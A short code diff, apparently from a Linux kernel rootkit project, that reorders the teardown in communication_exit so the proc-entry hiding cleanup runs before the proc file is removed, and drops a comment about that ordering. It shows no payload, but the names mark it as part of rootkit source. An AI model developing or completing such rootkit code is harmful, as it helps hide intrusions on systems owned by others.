@@ -62,9 +62,8 @@ int communication_init(void) {
 }
 
 void communication_exit(void) {
+	hideProcEntry_exit();
 	remove_proc_entry(PROC_FILE_NAME, PARENT_PROC_ENTRY);
-
-	hideProcEntry_exit(); //note if this starts to depend on the proc entry ensure this is run BEFORE REMOVING THE PROC ENTRY
 }
 
 #define ROOTKIT_BUFFER_LENGTH 100
